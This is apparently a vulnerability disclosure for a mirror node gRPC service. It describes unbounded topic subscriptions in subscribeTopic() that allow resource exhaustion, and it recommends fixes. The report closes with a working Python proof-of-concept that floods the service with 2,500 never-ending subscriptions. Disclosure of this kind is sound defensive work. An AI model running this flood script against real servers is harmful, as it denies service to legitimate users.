### Title
Unbounded Concurrent Subscriptions via `subscribeTopic()` Enables Resource Exhaustion DoS

### Summary
`TopicMessageServiceImpl.subscribeTopic()` increments a global `subscriberCount` metric on every new subscription but never enforces a ceiling on that count. Because the only server-side concurrency control is a per-connection call limit of 5, an unauthenticated attacker who opens many TCP connections can drive the total active subscription count to an arbitrary value, exhausting thread-pool, database-connection, and reactive-scheduler resources and denying service to legitimate users.

### Finding Description

**Exact code path:**

`grpc/src/main/java/org/hiero/mirror/grpc/service/TopicMessageServiceImpl.java`, lines 88–91:

```java
return topicExists(filter)
        .thenMany(flux.doOnNext(topicContext::onNext)
                .doOnSubscribe(s -> subscriberCount.incrementAndGet())   // line 89
                .doFinally(s -> subscriberCount.decrementAndGet())        // line 90
                .doFinally(topicContext::finished));
```

`subscriberCount` is declared as a plain `AtomicLong` (line 48) and registered only as a Micrometer `Gauge` metric (lines 52–55). There is no guard that reads this counter and rejects new subscriptions when it exceeds a threshold.

**Per-connection limit is insufficient:**

`grpc/src/main/java/org/hiero/mirror/grpc/config/GrpcConfiguration.java`, line 33:
```java
serverBuilder.maxConcurrentCallsPerConnection(nettyProperties.getMaxConcurrentCallsPerConnection());
```

`grpc/src/main/java/org/hiero/mirror/grpc/config/NettyProperties.java`, line 14:
```java
private int maxConcurrentCallsPerConnection = 5;
```

This caps calls **per TCP connection** at 5. There is no limit on the number of TCP connections a single IP may open, no authentication requirement on the gRPC endpoint, and no server interceptor performing rate-limiting or IP-based throttling (the only interceptor found is a test-only class).

**Per-subscription resource cost:**

Each call to `subscribeTopic()` allocates:
- A `TopicContext` object with two `AtomicLong`s and an `AtomicReference`.
- A `historical` Flux backed by `topicMessageRetriever.retrieve()` — issues DB queries.
- A `live` Flux backed by `topicListener.listen()` — holds a Redis/shared-poll subscription.
- A `safetyCheck` Flux scheduled on `Schedulers.boundedElastic()` — occupies a bounded-elastic thread after 1 second.
- A `pastEndTime` Flux that polls on a timer if `endTime` is set.

With no `endTime` and no `limit`, the subscription never self-terminates (`pastEndTime` returns `Flux.never()`), so all resources are held indefinitely.

### Impact Explanation

An attacker opening *K* TCP connections can hold *5K* concurrent long-lived subscriptions. Each subscription drives periodic DB polling (retriever) and maintains a live listener registration. At scale this exhausts:
- The `boundedElastic` scheduler thread pool (safety-check tasks).
- The database connection pool (each retriever poll issues a query).
- Redis pub/sub subscriptions (one per live subscription).
- JVM heap (one `TopicContext` + reactive chain per subscription).

Legitimate subscribers receive degraded or no service. The `subscriberCount` gauge only surfaces the problem in metrics; it does not prevent it.

### Likelihood Explanation

No authentication is required to call `subscribeTopic()`. The gRPC port (default 5600) is publicly reachable. A single attacker machine can open thousands of TCP connections and saturate the server with 5 calls each. The attack is trivially scriptable with any gRPC client library and requires no special knowledge beyond the public proto definition. It is repeatable and persistent as long as the attacker keeps connections open.

### Recommendation

1. **Enforce a global subscriber ceiling** — read `subscriberCount` before accepting a new subscription and return `RESOURCE_EXHAUSTED` if it exceeds a configurable maximum:
   ```java
   if (subscriberCount.get() >= grpcProperties.getMaxSubscribers()) {
       return Flux.error(new StatusRuntimeException(Status.RESOURCE_EXHAUSTED));
   }
   ```
2. **Add a per-IP or per-client connection limit** — configure `NettyServerBuilder.maxConnectionsPerIp()` or add a server interceptor that tracks and caps connections per remote address.
3. **Require authentication** — add a gRPC server interceptor that validates a bearer token or mTLS certificate before allowing any `subscribeTopic()` call.
4. **Add `maxConcurrentCallsPerConnection` to `NettyProperties`** as a documented, operator-tunable value and expose a companion `maxConnections` property.

### Proof of Concept

```python
import grpc, threading
from com.hedera.mirror.api.proto import consensus_service_pb2_grpc, consensus_service_pb2
from proto.mirror import consensus_topic_query_pb2

TARGET = "mirror-node-grpc:5600"
CONNECTIONS = 500   # open 500 TCP connections
CALLS_PER_CONN = 5  # maxConcurrentCallsPerConnection default

def flood(conn_id):
    channel = grpc.insecure_channel(TARGET)
    stub = consensus_service_pb2_grpc.ConsensusServiceStub(channel)
    query = consensus_service_pb2.ConsensusTopicQuery(
        topicID=...,   # any valid topic ID
        # no limit, no endTime → subscription never terminates
    )
    threads = []
    for _ in range(CALLS_PER_CONN):
        t = threading.Thread(target=lambda: list(stub.subscribeTopic(query)))
        t.start()
        threads.append(t)
    for t in threads:
        t.join()

workers = [threading.Thread(target=flood, args=(i,)) for i in range(CONNECTIONS)]
for w in workers: w.start()
# Result: 2500 concurrent subscriptions, DB pool exhausted, legitimate subscribers time out
```

**Preconditions:** Network access to gRPC port; a valid (or non-existent with `checkTopicExists=false`) topic ID.
**Trigger:** Run the script above.
